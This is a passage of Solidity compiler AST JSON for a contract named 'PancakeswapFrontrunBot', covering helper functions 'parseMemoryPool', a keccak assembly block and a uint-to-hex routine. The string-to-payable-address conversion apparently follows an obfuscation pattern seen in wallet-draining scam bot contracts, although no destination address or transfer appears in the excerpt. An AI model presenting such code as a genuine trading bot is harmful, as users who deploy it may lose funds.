														},
														"typeName": {
															"id": 978,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9390:7:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 981,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9390:14:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"functionReturnParameters": 814,
												"id": 982,
												"nodeType": "Return",
												"src": "9383:21:3"
											}
										]
									},
									"documentation": null,
									"id": 984,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "parseMemoryPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 811,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 810,
												"mutability": "mutable",
												"name": "_a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 984,
												"src": "8497:16:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 809,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "8497:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8496:18:3"
									},
									"returnParameters": {
										"id": 814,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 813,
												"mutability": "mutable",
												"name": "_parsed",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 984,
												"src": "8538:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 812,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "8538:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8537:17:3"
									},
									"scope": 1724,
									"src": "8472:940:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 992,
										"nodeType": "Block",
										"src": "9652:104:3",
										"statements": [
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "9672:77:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "9687:51:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "9714:4:3"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "9720:2:3",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "9710:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "9710:13:3"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9704:5:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9704:20:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "self",
																				"nodeType": "YulIdentifier",
																				"src": "9732:4:3"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "9726:5:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "9726:11:3"
																	}
																],
																"functionName": {
																	"name": "keccak256",
																	"nodeType": "YulIdentifier",
																	"src": "9694:9:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "9694:44:3"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "9687:3:3"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 989,
														"isOffset": false,
														"isSlot": false,
														"src": "9687:3:3",
														"valueSize": 1
													},
													{
														"declaration": 986,
														"isOffset": false,
														"isSlot": false,
														"src": "9714:4:3",
														"valueSize": 1
													},
													{
														"declaration": 986,
														"isOffset": false,
														"isSlot": false,
														"src": "9732:4:3",
														"valueSize": 1
													}
												],
												"id": 991,
												"nodeType": "InlineAssembly",
												"src": "9663:86:3"
											}
										]
									},
									"documentation": null,
									"id": 993,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "keccak",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 987,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 986,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 993,
												"src": "9597:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 985,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "9597:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9596:19:3"
									},
									"returnParameters": {
										"id": 990,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 989,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 993,
												"src": "9639:11:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 988,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "9639:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9638:13:3"
									},
									"scope": 1724,
									"src": "9581:175:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1148,
										"nodeType": "Block",
										"src": "10048:945:3",
										"statements": [
											{
												"assignments": [
													1001
												],
												"declarations": [
													{
														"constant": false,
														"id": 1001,
														"mutability": "mutable",
														"name": "count",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1148,
														"src": "10059:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1000,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10059:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1003,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 1002,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10072:1:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10059:14:3"
											},
											{
												"assignments": [
													1005
												],
												"declarations": [
													{
														"constant": false,
														"id": 1005,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1148,
														"src": "10084:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1004,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10084:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1007,
												"initialValue": {
													"argumentTypes": null,
													"id": 1006,
													"name": "a",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 995,
													"src": "10093:1:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10084:10:3"
											},
											{
												"body": {
													"id": 1018,
													"nodeType": "Block",
													"src": "10120:56:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1012,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "10135:7:3",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 1011,
																	"name": "count",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1001,
																	"src": "10135:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1013,
															"nodeType": "ExpressionStatement",
															"src": "10135:7:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1016,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1014,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1005,
																	"src": "10157:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 1015,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10162:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10157:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1017,
															"nodeType": "ExpressionStatement",
															"src": "10157:7:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1010,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1008,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1005,
														"src": "10112:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1009,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10117:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "10112:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1019,
												"nodeType": "WhileStatement",
												"src": "10105:71:3"
											},
											{
												"assignments": [
													1021
												],
												"declarations": [
													{
														"constant": false,
														"id": 1021,
														"mutability": "mutable",
														"name": "res",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1148,
														"src": "10186:16:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1020,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10186:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1026,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1024,
															"name": "count",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1001,
															"src": "10215:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1023,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "10205:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 1022,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "10209:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 1025,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10205:16:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10186:35:3"
											},
											{
												"body": {
													"id": 1062,
													"nodeType": "Block",
													"src": "10261:115:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1041,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1037,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1005,
																	"src": "10276:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1040,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 1038,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 995,
																		"src": "10280:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "3136",
																		"id": 1039,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10284:2:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_16_by_1",
																			"typeString": "int_const 16"
																		},
																		"value": "16"
																	},
																	"src": "10280:6:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "10276:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1042,
															"nodeType": "ExpressionStatement",
															"src": "10276:10:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1056,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1043,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1021,
																		"src": "10301:3:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1049,
																	"indexExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1048,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1046,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1044,
																				"name": "count",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1001,
																				"src": "10305:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1045,
																				"name": "i",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1028,
																				"src": "10313:1:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "10305:9:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 1047,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "10317:1:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "10305:13:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "10301:18:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1053,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1005,
																					"src": "10339:1:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1052,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "10333:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1051,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "10333:5:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1054,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "10333:8:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1050,
																		"name": "toHexDigit",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1511,
																		"src": "10322:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint8_$returns$_t_bytes1_$",
																			"typeString": "function (uint8) pure returns (bytes1)"
																		}
																	},
																	"id": 1055,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "10322:20:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "10301:41:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1057,
															"nodeType": "ExpressionStatement",
															"src": "10301:41:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1060,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1058,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 995,
																	"src": "10357:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 1059,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10362:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10357:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1061,
															"nodeType": "ExpressionStatement",
															"src": "10357:7:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1033,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1031,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1028,
														"src": "10247:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1032,
														"name": "count",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1001,
														"src": "10249:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10247:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1063,
												"initializationExpression": {
													"assignments": [
														1028
													],
													"declarations": [
														{
															"constant": false,
															"id": 1028,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 1063,
															"src": "10237:6:3",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 1027,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "10237:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 1030,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1029,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10244:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "10237:8:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1035,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": true,
														"src": "10256:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 1034,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1028,
															"src": "10258:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1036,
													"nodeType": "ExpressionStatement",
													"src": "10256:3:3"
												},
												"nodeType": "ForStatement",
												"src": "10232:144:3"
											},
											{
												"assignments": [
													1065
												],
												"declarations": [
													{
														"constant": false,
														"id": 1065,
														"mutability": "mutable",
														"name": "hexLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1148,
														"src": "10386:14:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1064,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "10386:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1074,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1070,
																		"name": "res",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1021,
																		"src": "10416:3:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"id": 1069,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "10409:6:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_string_storage_ptr_$",
																		"typeString": "type(string storage pointer)"
																	},
																	"typeName": {
																		"id": 1068,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "10409:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1071,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "10409:11:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															],
															"id": 1067,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "10403:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																"typeString": "type(bytes storage pointer)"
															},
															"typeName": {
																"id": 1066,
																"name": "bytes",
																"nodeType": "ElementaryTypeName",
																"src": "10403:5:3",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 1072,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "10403:18:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													},
													"id": 1073,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "length",
													"nodeType": "MemberAccess",
													"referencedDeclaration": null,
													"src": "10403:25:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10386:42:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1077,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1075,
														"name": "hexLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1065,
														"src": "10443:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "34",
														"id": 1076,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "10456:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_4_by_1",
															"typeString": "int_const 4"
														},
														"value": "4"
													},
													"src": "10443:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1093,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1091,
															"name": "hexLength",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1065,
															"src": "10572:9:3",
															"typeDescriptions": {
